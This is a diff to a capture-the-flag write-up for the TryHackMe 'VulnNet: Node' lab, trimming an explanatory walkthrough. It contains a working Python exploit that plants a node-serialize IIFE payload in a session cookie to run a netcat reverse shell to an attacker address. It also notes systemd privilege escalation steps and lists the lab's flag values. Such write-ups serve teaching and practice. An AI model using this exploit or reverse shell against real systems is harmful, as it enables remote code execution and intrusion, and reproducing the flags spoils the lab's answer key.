@@ -37,8 +37,6 @@ sudo nmap -sU -v node -oA udpscan-node
 |_http-title: VulnNet – Your reliable news source – Try Now!
 ```
 
-UDP had nothing useful — only `68/udp` (dhcpc) and `5353/udp` (zeroconf) in filtered state.
-
 ### Web Enumeration
 
 ```bash
@@ -125,19 +123,7 @@ import sys
 import urllib.parse
 import requests
 
-BANNER = r"""
- __   __    _ _       _   _      _     _   _           _
- \ \ / /  | | |     | \ | |    | |   | \ | |         | |
-  \ V /   | | |_ _  |  \| | ___| |_  |  \| | ___   __| | ___
-   > <    | | | | | | . ` |/ _ \ __| | . ` |/ _ \ / _` |/ _ \
-  / . \  _| | | |_| | |\  |  __/ |_  | |\  | (_) | (_| |  __/
- /_/ \_\(_)_|_|\__,_|_| \_|\__|\__| |_| \_|\___/ \__,_|\___|
-        node-serialize deserialization RCE
-"""
-
-
 def build_payload(cmd: str) -> str:
-    """Build node-serialize IIFE RCE payload, return URL-encoded base64 cookie."""
     cmd_escaped = cmd.replace("'", "\\'")
     iife = f"_$$ND_FUNC$$_function(){{require('child_process').exec('{cmd_escaped}')}}()"
     obj = {
@@ -150,46 +136,27 @@ def build_payload(cmd: str) -> str:
     b64 = base64.b64encode(raw.encode()).decode()
     return urllib.parse.quote(b64)
 
-
-def send(target: str, cookie: str, verbose: bool = False) -> requests.Response:
+def send(target: str, cookie: str) -> requests.Response:
     url = target.rstrip('/')
     headers = {"Cookie": f"session={cookie}"}
-    if verbose:
-        print(f"[*] Sending to: {url}")
-        print(f"[*] Cookie: session={cookie}")
     return requests.get(url, headers=headers, timeout=10)
 
-
 def main():
-    print(BANNER)
-    parser = argparse.ArgumentParser(
-        description="VulnNet-Node node-serialize RCE exploit (reverse shell only)"
-    )
-    parser.add_argument("target", help="Target URL e.g. http://node:8080")
-    parser.add_argument("lhost", help="Your IP address")
-    parser.add_argument("lport", help="Your port for reverse shell")
-    parser.add_argument("-v", "--verbose", action="store_true")
+    parser = argparse.ArgumentParser()
+    parser.add_argument("target")
+    parser.add_argument("lhost")
+    parser.add_argument("lport")
     args = parser.parse_args()
 
     cmd = f'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {args.lhost} {args.lport} >/tmp/f'
-    print(f"[*] Reverse shell → {args.lhost}:{args.lport}")
-    print(f"[!] Start listener: nc -lvnp {args.lport}")
-
     cookie = build_payload(cmd)
     try:
-        send(args.target, cookie, verbose=args.verbose)
+        send(args.target, cookie)
     except requests.exceptions.ConnectionError:
         pass
 
-    print("[*] Payload sent. Check your listener.")
-
-
 if __name__ == "__main__":
-    try:
-        main()
-    except KeyboardInterrupt:
-        print("\n[!] Interrupted")
-        sys.exit(0)
+    main()
 ```
 
 ```bash
@@ -197,7 +164,7 @@ if __name__ == "__main__":
 nc -nlvp 4444
 
 # trigger
-python3 exploit.py 'http://node:8080' 192.168.204.251 4444 -v
+python3 exploit.py 'http://node:8080' 192.168.204.251 4444
 ```
 
 ```
@@ -319,10 +286,6 @@ find /etc/systemd/system/ -writable 2>/dev/null
 
 ### Modify the Service
 
-```bash
-cat /etc/systemd/system/vulnnet-job.service
-```
-
 Edit `ExecStart` to SUID `/bin/bash`:
 
 ```ini
@@ -416,3 +379,24 @@ THM{abea728f211b105a608a720a37adabf9}
 - SUID bash from an elevated context is a reliable lateral movement primitive when you can't directly spawn a persistent shell
 - Writable systemd unit files are a root escalation path as long as the attacker can trigger a reload and start — `daemon-reload` + `start` rights complete the chain
 - Always enumerate `/etc/systemd/system/` for write permissions after gaining any foothold
+
+---
+
+## 🛠️ Tools Used
+
+| Tool | Purpose |
+| --- | --- |
+| `nmap` | Port and service enumeration |
+| `ffuf` | Directory and login endpoint discovery |
+| Python exploit | node-serialize deserialization RCE via IIFE in session cookie |
+| `nc` | Reverse shell listener |
+| `npm` | Abused via sudo to spawn shell as serv-manage |
+| `ssh` | Persistent access via injected public key |
+| `systemctl` | Reload and start modified vulnnet-auto.timer for root escalation |
+
+## 🚩 Flags
+
+| Flag | Value |
+| --- | --- |
+| `user.txt` | `THM{064640a2f880ce9ed7a54886f1bde821}` |
+| `root.txt` | `THM{abea728f211b105a608a720a37adabf9}` |
